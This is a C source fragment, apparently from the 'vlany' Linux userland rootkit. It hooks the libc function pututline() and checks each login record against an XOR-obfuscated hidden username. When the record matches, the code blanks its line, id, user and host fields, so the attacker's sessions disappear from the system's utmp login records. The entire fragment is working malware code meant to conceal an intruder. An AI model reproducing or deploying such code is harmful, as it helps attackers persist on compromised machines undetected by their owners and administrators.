struct utmp *pututline(const struct utmp *ut)
{
    #ifdef DEBUG
        printf("[vlany] pututline() called\n");
    #endif

    HOOK(old_pututline, CPUTUTLINE);

    struct utmp *tmp;
    tmp = old_pututline(ut);

    if(tmp && tmp->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(tmp->ut_user, vlany_user))
        {
            CLEAN(vlany_user);
            strncpy(tmp->ut_line, "\0", strlen(tmp->ut_line));
            strncpy(tmp->ut_id, "\0", strlen(tmp->ut_id));
            strncpy(tmp->ut_user, "\0", strlen(tmp->ut_user));
            strncpy(tmp->ut_host, "\0", strlen(tmp->ut_host));
            return tmp;
        }
        CLEAN(vlany_user);
    }

    return old_pututline(ut);
}
